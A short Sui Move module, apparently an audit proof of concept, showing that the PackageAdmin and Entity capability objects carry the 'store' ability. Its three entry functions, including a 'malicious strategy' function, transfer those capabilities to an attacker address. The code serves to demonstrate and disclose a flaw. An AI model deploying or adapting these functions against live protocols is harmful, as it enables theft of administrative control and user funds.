module exploit::admin_cap_theft;

use access_management::access::{PackageAdmin, Entity};
use sui::transfer;
use sui::tx_context::{Self, TxContext};

/// This exploit demonstrates that because PackageAdmin and Entity have `store` ability,
/// they can be publicly transferred to any address using `transfer::public_transfer`.
///
/// If an attacker can get a reference to these objects (e.g., through a malicious strategy),
/// they can steal the admin capability and call privileged functions.

public entry fun steal_package_admin(cap: PackageAdmin, attacker: address) {
    // Because PackageAdmin has `store` ability, we can call public_transfer.
    // If it only had `key` ability, this would not compile!
    transfer::public_transfer(cap, attacker);
}

public entry fun steal_entity(entity: Entity, attacker: address) {
    // Same for Entity.
    transfer::public_transfer(entity, attacker);
}

/// A malicious strategy could be registered in the SAV or Leverage Core,
/// and if the protocol passes an AdminCap or Entity to it, the strategy can steal it.
public entry fun malicious_strategy_function(cap: PackageAdmin, ctx: &mut TxContext) {
    let attacker = tx_context::sender(ctx);
    transfer::public_transfer(cap, attacker);
}
